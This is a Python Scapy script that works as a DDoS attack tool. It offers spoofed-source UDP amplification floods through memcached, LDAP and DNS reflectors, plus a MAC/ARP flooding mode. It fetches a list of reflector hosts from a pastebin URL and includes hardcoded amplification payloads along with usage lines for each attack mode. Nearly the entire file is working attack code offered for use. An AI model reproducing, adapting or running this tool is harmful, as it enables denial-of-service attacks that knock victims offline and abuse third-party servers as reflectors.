from scapy.all import *
import sys, datetime, argparse, urllib2, threading
print("""

                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~

  """)
print(datetime.datetime.now())

parser = argparse.ArgumentParser()
parser.add_argument("-A", help="1 - Memcrashed | 2 - LDAP | 3 - DNS | 4 - MAC Flodding")
parser.add_argument("-T", help="Target")
parser.add_argument("-F", help="File amplification")
parser.add_argument("-Thread", default=10, help="Thread")
parser.add_argument("-N", default=40, help="Number of packages")
args = parser.parse_args()

def sends(data, port):
  global servers
  global current
  amp = servers[current]
  current = current + 1
  packet = send(IP(dst=amp, src=target)/UDP(dport=port)/Raw(load=data), count=int(powers))

def macflood(target, powers):
  sendp(Ether(src=RandMAC(), dst=target )/ARP(op=2, psrc="0.0.0.0", hwdst=target)/Padding(load="X"*18), count=int(powers))


print("""

1. Memcrashed: -A 1 -T xx.xx.xx.xx -F bot.txt -N 40 -Thread 10
2. LDAP:       -A 2 -T xx.xx.xx.xx -F bot.txt -N 40 -Thread 10
3. DNS:        -A 3 -T xx.xx.xx.xx -F bot.txt -N 40 -Thread 10
4. Mac-flood:  -A 4 -T FFFF.FFFF.FFFF         -N 40 -Thread 10

  """)

req = urllib2.urlopen('https://pastebin.com/raw/eSCHTTVu')
f = open('bot.txt', 'w')
print('Bots are uploaded to the bot.txt file.')
f.write(req.read())
f.close()

attack = args.A
target = args.T
server = args.F
powers = args.N
numthreads = int(args.Thread)

servers = []
current = 0
with open(server) as f:
    servers = f.readlines()

countserver = int(len(servers))
if(numthreads > countserver):
  print('You have entered a floor more than servers.')
  print('Servers: '+ str(countserver))
  exit(0)


data = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"

dns  = "\xc4\x75\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\xff\x00\x01\x00\x00\x29\x23\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"


ldap =  "\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a"
ldap += "\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01"
ldap += "\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65"
ldap += "\x63\x74\x63\x6c\x61\x73\x73\x30\x00\x00"
ldap += "\x00\x30\x84\x00\x00\x00\x0a\x04\x08\x4e"
ldap += "\x65\x74\x6c\x6f\x67\x6f\x6e"


def threads(numthreads, arg1, arg2):
  threads = []
  for n in range(numthreads):
    thread = threading.Thread(target=sends, args=(arg1, arg2))
    thread.daemon = True
    thread.start()
    time.sleep(1)

    threads.append(thread)

if(len(sys.argv) < 4) or (target == None) or (server == None) or (attack == None):
  print('You run the script without parameters')
elif(attack == '1'):
  threads(numthreads, data, 11211)
elif(attack == '2'):
  threads(numthreads, ldap, 389)
elif(attack == '3'):
  threads(numthreads, dns, 53)
elif(attack == '4'):
  threads(numthreads, target, powers)
